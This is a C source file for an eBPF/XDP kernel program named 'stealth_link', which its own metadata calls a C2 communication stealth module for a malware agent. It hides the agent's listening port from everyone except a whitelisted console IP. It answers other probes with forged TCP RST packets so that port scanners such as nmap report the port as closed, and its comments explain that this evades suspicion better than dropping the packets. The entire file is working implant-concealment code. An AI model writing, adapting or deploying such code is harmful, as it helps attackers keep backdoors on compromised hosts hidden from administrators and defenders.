#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"stealth_link\","
      "\"desc\":\"XDP C2 Communication Stealth: Hides Agent listening ports, allows only authorized IP connections, and blocks port scanning/probing.\","
      "\"requires\":[\"is_root\",\"xdp\",\"cap_net_admin\"],"
      "\"options\":{"
        "\"target\":[\"4444\",\"Agent listening port (the port number to hide)\"]"
      "},"
      "\"maps\":{"
        "\"target\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"},"
        "\"whitelist\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
      "}"
    "}";

/*
 * Set of C2 ports to be hidden (Host Byte Order)
 * update format: config[0:2]=port(u16 LE), config[2:6]=1(u32 LE)
 * 
 * Effect: TCP SYN packets from unauthorized IPs to this port will be silently dropped.
 *         Port scanners (nmap) will perceive the port as filtered/closed.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 16);
    __type(key, __u16);    /* 端口号（主机字节序） */
    __type(value, __u32);  /* 占位 */
} target SEC(".maps");

/*
 * IP Whitelist for authorized connections (IPv4 addresses in Network Byte Order)
 * Whitelist empty + locked==0: Allow all (startup phase waiting for Console connection)
 * Whitelist non-empty + locked==1: Only IPs in whitelist allowed, others get RST
 * Agent writes both IP and locked flag when calling stealth_allow_ip().
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u32);    /* IPv4 地址（网络字节序） */
    __type(value, __u32);  /* 占位 */
} whitelist SEC(".maps");

/* Whitelist lock flag: 0=unlocked (allow all), 1=locked (allow only whitelist) */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} whitelist_count SEC(".maps");

/* IP Checksum Calculation */
static __always_inline __u16 csum_fold(__u32 sum) {
    sum = (sum & 0xffff) + (sum >> 16);
    sum = (sum & 0xffff) + (sum >> 16);
    return (__u16)~sum;
}

static __always_inline __u32 csum_add(__u32 sum, __u32 val) {
    sum += val;
    if (sum < val) sum++;
    return sum;
}

/*
 * XDP Core Logic — RST Camouflage Mode:
 * 
 * For unauthorized C2 port access, instead of silent drop (nmap reports filtered),
 * we construct a TCP RST response on the spot (nmap reports closed).
 * 
 * A 'closed' state looks like a normal port with no service listening,
 * which is much stealthier than 'filtered' — which implies "a firewall is protecting something".
 */
SEC("xdp")
int stealth_link_xdp(struct xdp_md *ctx) {
    void *data     = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;

    /* ---- Layer 2: Ethernet ---- */
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end)
        return XDP_PASS;

    /* 仅处理 IPv4 */
    if (eth->h_proto != bpf_htons(0x0800))  /* ETH_P_IP */
        return XDP_PASS;

    /* ---- Layer 3: IPv4 ---- */
    struct iphdr *ip = (void *)(eth + 1);
    if ((void *)(ip + 1) > data_end)
        return XDP_PASS;

    /* Only handle TCP */
    if (ip->protocol != 6)  /* IPPROTO_TCP */
        return XDP_PASS;

    /* ---- Layer 4: TCP ---- */
    struct tcphdr *tcp = (void *)ip + (ip->ihl * 4);
    if ((void *)(tcp + 1) > data_end)
        return XDP_PASS;

    /* Extract destination port (Network → Host Byte Order) */
    __u16 dport = bpf_ntohs(tcp->dest);

    /* Non-C2 port, pass through */
    if (!bpf_map_lookup_elem(&target, &dport))
        return XDP_PASS;

    /* ---- C2 Port Hit ---- */

    /* Whitelist Check:
     *   Empty whitelist → Pass (waiting for first Console connection; agent writes IP after connection)
     *   Non-empty whitelist → Only whitelist IPs pass, others get RST
     * This allows Console to connect in bind mode;
     * In reverse mode, the agent pre-writes the Console IP before connecting for full filtering. */
    __u32 src_ip = ip->saddr;
    __u32 zero_key = 0;
    /* 用 allowed_ips 的第一个位置（key=0 的 Array 计数器已删除，
       改用 Hash map 非空检测：尝试查任意已知 IP；
       这里直接查来源 IP，在白名单为空时 lookup 返回 NULL，也就放行。
       一旦白名单非空，只有被加入的 IP 能通过。 */
    /* 若白名单中存在 src_ip 则放行 */
    if (bpf_map_lookup_elem(&whitelist, &src_ip))
        return XDP_PASS;  /* 在白名单中，放行 */

    /* 白名单非空但 src_ip 不在其中 → RST
     * 白名单为空时也走到这里——但需要区分两种情况：
     * 用一个独立的 Array Map（单元素）作为"已锁定"标志 */
    __u32 *locked = bpf_map_lookup_elem(&whitelist_count, &zero_key);
    if (!locked || *locked == 0)
        return XDP_PASS;  /* 尚未锁定，放行所有 */
    /* Locked and not in whitelist → Continue to construct RST */

    /* ========== Construct TCP RST response (in-place modification + XDP_TX) ========== */

    /* -- Swap MAC -- */
    unsigned char tmp_mac[6];
    __builtin_memcpy(tmp_mac, eth->h_dest, 6);
    __builtin_memcpy(eth->h_dest, eth->h_source, 6);
    __builtin_memcpy(eth->h_source, tmp_mac, 6);

    /* -- Swap IP -- */
    __u32 tmp_ip = ip->saddr;
    ip->saddr = ip->daddr;
    ip->daddr = tmp_ip;
    ip->tot_len = bpf_htons(40); /* IP(20) + TCP(20), 无 payload */
    ip->ttl = 64;
    ip->check = 0;

    /* 重算 IP 校验和 */
    __u32 ip_sum = 0;
    __u16 *ip_hdr = (__u16 *)ip;
    #pragma unroll
    for (int i = 0; i < 10; i++)
        ip_sum = csum_add(ip_sum, ip_hdr[i]);
    ip->check = csum_fold(ip_sum);

    /* -- Craft TCP RST -- */
    __u16 tmp_port = tcp->source;
    tcp->source = tcp->dest;
    tcp->dest = tmp_port;

    /* ACK number = sender's SEQ + 1 */
    __u32 their_seq = bpf_ntohl(tcp->seq);
    tcp->seq = tcp->ack_seq;
    tcp->ack_seq = bpf_htonl(their_seq + 1);

    /* Clear all TCP flags, set only RST + ACK */
    *((__u8 *)tcp + 13) = 0x14; /* RST=1, ACK=1 */
    tcp->doff = 5;  /* 20 bytes, 无 options */
    tcp->window = 0;
    tcp->urg_ptr = 0;
    tcp->check = 0;

    /* TCP Pseudo-header Checksum */
    __u32 tcp_sum = 0;
    tcp_sum = csum_add(tcp_sum, ip->saddr & 0xffff);
    tcp_sum = csum_add(tcp_sum, ip->saddr >> 16);
    tcp_sum = csum_add(tcp_sum, ip->daddr & 0xffff);
    tcp_sum = csum_add(tcp_sum, ip->daddr >> 16);
    tcp_sum = csum_add(tcp_sum, bpf_htons(6));    /* IPPROTO_TCP */
    tcp_sum = csum_add(tcp_sum, bpf_htons(20));   /* TCP 段长度 */
    __u16 *tcp_hdr = (__u16 *)tcp;
    #pragma unroll
    for (int i = 0; i < 10; i++)
        tcp_sum = csum_add(tcp_sum, tcp_hdr[i]);
    tcp->check = csum_fold(tcp_sum);

    /* Truncate packet to ETH+IP+TCP = 54 bytes */
    bpf_xdp_adjust_tail(ctx, (int)(sizeof(struct ethhdr) + 20 + 20) -
                              (int)(data_end - data));

    return XDP_TX;
}
